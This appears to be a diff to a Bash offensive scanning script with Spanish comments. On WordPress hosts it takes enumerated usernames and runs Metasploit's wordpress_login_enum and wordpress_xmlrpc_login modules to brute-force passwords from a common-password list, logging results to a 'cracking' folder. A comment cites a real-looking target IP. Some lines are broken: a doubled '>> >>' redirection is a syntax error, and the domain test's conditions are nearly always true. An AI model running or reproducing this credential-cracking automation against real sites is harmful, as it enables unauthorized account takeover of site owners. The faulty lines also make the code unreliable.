@@ -193,18 +193,32 @@ then
 			if [[ $fingerprint = *"wordpress"* ]]; then
 				echo -e "\t[+] Wordpress identificado en $ip:$port"
 				echo -e "\t[+] Probando contraseñas comunes ...."				
+				# 
 				if [ -f ".vulnerabilidades2/"$ip"_"$port"_wpUsers.txt" ]; then
 					#https://181.115.188.36:443/				
 					for user in $(cat .vulnerabilidades2/"$ip"_"$port"_wpUsers.txt | awk '{print $2}'); do
 						echo -e "\t\t[+] Probando usuarios identificados. Probando con usuario ($user)"
-						#$ip = dominio
+						#Dominio
 						if [[ ${ip} == *"bo"* || ${ip} == *"com"*  || ${ip} == *"net"* || ${ip} != *"org"* || ${ip} != *"net"* ]];then 
 							real_ip=`host $ip | grep address |  awk '{print $4}'` # si es dominio, obtenemos su IP
-							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
-							msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							# login normal
+							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip; set rport $port; set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip; set rport $port; set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							echo "" >> >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+
+							# login xmlrpc
+							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip; set rport $port; set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip; set rport $port; set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
 						else
-							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
-							msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						#IP
+							# login normal
+							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							echo "" >> >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							
+							# login xmlrpc
+							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
 						fi
 					done
 				else
